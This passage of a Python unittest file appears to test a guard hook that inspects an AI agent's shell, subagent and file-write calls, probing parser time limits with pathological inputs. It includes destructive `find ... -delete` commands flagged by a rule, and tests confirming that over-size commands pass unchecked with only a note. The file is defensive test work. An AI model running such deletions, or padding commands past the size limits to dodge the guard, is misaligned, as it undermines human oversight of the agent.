                           ('lines.py', "Path('a'" + '\n' * 65536 + "+ NAME))\n"),
                           ('concat.py', "'a'" + ' ' * 65536 + "x\n")):
            with self.subTest(name=name):
                self.put('workspace/data/scripts/' + name, head + body)
                t = time.monotonic()
                self.assertIsNone(self.call('Bash', {'command': 'python3 workspace/data/scripts/' + name}, 'lim-6'))
                self.assertLess(time.monotonic() - t, 2.0)

    def test_long_loops_tick_the_deadline(self):
        # the loops over a command's pipelines and over a program's strings check the time as they go
        ticks, orig = [], g.Budget.tick
        g.Budget.tick = lambda b: ticks.append(1) or orig(b)
        try:
            self.call('Bash', {'command': 'true; ' * 2560}, 'lim-4')
            pipes = len(ticks)
            del ticks[:]
            self.put('_scratch/many.py', "open('_scratch/out.txt', 'w')\nx = [%s]\n"
                     % ', '.join("'s%d'" % i for i in range(10240)))
            self.call('Bash', {'command': 'python3 _scratch/many.py'}, 'lim-5')
            strings = len(ticks)
        finally:
            g.Budget.tick = orig
        self.assertGreaterEqual(pipes, 2 * 2560 // 256)           # segments and pipelines, every 256 each
        self.assertGreaterEqual(strings, 10240 // 1024)           # strings, every 1024

    def test_unclosed_heredocs_and_long_pipelines_are_linear(self):
        import time
        for cmd in ('EOF\n' + 'cat <<EOF\n' * 20000, 'echo a' + ' | cat' * 30000, '{ ' * 8000 + 'ls' + '; } > f' * 8000):
            t = time.monotonic()
            self.call('Bash', {'command': cmd}, 'lim-3')
            self.assertLess(time.monotonic() - t, 3.0)          # 20 s and more before
        segs, pipes, bodies = g.parse('cat <<A\nx\nA\ncat <<-B\n\ty\n\tB\ncat <<A\nz')
        self.assertEqual(bodies, ['x', '\ty', 'z'])             # closed, tabbed, unclosed (the rest)

    def test_find_pattern_longer_than_a_file_name_is_not_compiled(self):
        seen, orig = [], g.fnmatch

        class Stub:
            @staticmethod
            def fnmatchcase(name, pat):
                seen.append(len(pat))
                return orig.fnmatchcase(name, pat)
        g.fnmatch = Stub
        try:
            out = self.call('Bash', {'command': "find . -name '%s' -delete" % ('[' * 20000)}, 'lim-4')
            short = self.call('Bash', {'command': "find . -name '*.aux' -delete"}, 'lim-4')
        finally:
            g.fnmatch = orig
        self.assertEqual(rules_of(out), {'S5'})                 # counts as a pattern that can match
        self.passes(short)
        self.assertTrue(seen and max(seen) <= 255)

    def test_over_the_limits_passes_with_the_note(self):
        cases = [('big', 'echo ' + 'a' * g.MAX_COMMAND),
                 ('expand', 'x=%s; python3 -c "%s"' % ('a' * 200000, '$x' * 6)),
                 ('scan', 'cat <<EOF\n' + 'x' * 100000 + '\nEOF\n' + 'python3 -c __HD0__;' * 200)]
        for name, cmd in cases:
            with self.subTest(name):
                out = self.call('Bash', {'command': cmd}, 'lim-5-' + name)
                self.assertIn('too large to check', out['systemMessage'])
        # more than MAX_READ of scripts in one call (each script read is at most 256 KiB)
        for k in range(9):
            self.put('_scratch/s%d.sh' % k, '# ' + 'x' * (256 * 1024) + '\n')
        out = self.call('Bash', {'command': '; '.join('sh _scratch/s%d.sh' % k for k in range(9))}, 'lim-5-read')
        self.assertIn('bytes of scripts to read', out['systemMessage'])
        orig = g.DEADLINE_S
        g.DEADLINE_S = -1.0
        try:
            out = self.call('Bash', {'command': 'ls'}, 'lim-5-deadline')
        finally:
            g.DEADLINE_S = orig
        self.assertIn('longer than', out['systemMessage'])

    @unittest.skipUnless(hasattr(os, 'mkfifo'), 'FIFOs are POSIX')
    def test_fifo_or_device_in_place_of_a_file_never_blocks(self):
        import hashlib
        prompt = {'subagent_type': 'source-verifier', 'description': 'x',
                  'prompt': 'Check chapter 1. You do not need to re-check the sentences again.'}
        e = {'CLAUDE_PROJECT_DIR': self.root, 'CEPHALO_GUARD_STATE_DIR': self.state, 'CEPHALO_GUARD_ON': 'P1',
             'CEPHALO_GUARD_OS': 'posix'}
        for kind in ('fifo', 'devzero'):
            with self.subTest(kind):
                sid = 'lim-6-' + kind
                sf = os.path.join(self.state, 'p1-%s.txt' % hashlib.sha256(sid.encode()).hexdigest()[:16])
                os.mkfifo(sf) if kind == 'fifo' else os.symlink('/dev/zero', sf)
                code, out, _ = run_script(json.dumps(payload('Agent', prompt, cwd=self.root, session=sid)).encode(), e)
                self.assertEqual(code, 0)
                self.assertIn('cephalo guard P1', out)          # checked; not remembered, so a note in context
                rep = os.path.join(self.root, 'workspace', 'output', 'verification', 'ch_%s_round_1.md' % kind)
                os.mkfifo(rep) if kind == 'fifo' else os.symlink('/dev/zero', rep)
                d = payload('Write', {'file_path': rep, 'content': '| a |\nStatus: ok\n'}, 'PostToolUse',
                            cwd=self.root, session=sid)
                code, out, _ = run_script(json.dumps(d).encode(), e)
                self.assertEqual(code, 0)
                self.assertIn('1 table rows', json.loads(out)['reason'])   # counted from the Write's content


if __name__ == '__main__':
    print('Python', sys.version.split()[0])
    unittest.main()
